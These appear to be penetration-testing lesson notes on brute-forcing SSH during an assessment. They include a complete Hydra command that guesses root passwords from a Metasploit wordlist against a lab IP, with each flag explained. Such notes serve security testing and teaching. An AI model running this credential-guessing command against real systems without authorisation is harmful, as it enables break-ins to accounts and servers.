<h2> SSH is not always a low hanging fruit </h2>
- From a realistic prospective If we see SSH on an assessment 
  will try to brute force against it. Or use weak or default credentials
- We are going to do that to test Password Strength
- We are going to test if we can go with a weak/default password
- How the blue team performs do they catch us or not 


We are going to use a tool called `Hydra` (i.e. a bruteforce tool) or `MSF console` as we have multiple frameworks for same task.
command : hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.142.129:22 -t 4 -V
where 
-l stands for user that we are going to utilize here.
-P stands for password list.
-t for threads that will limit to 4
-V for verbosity to see the user attempts
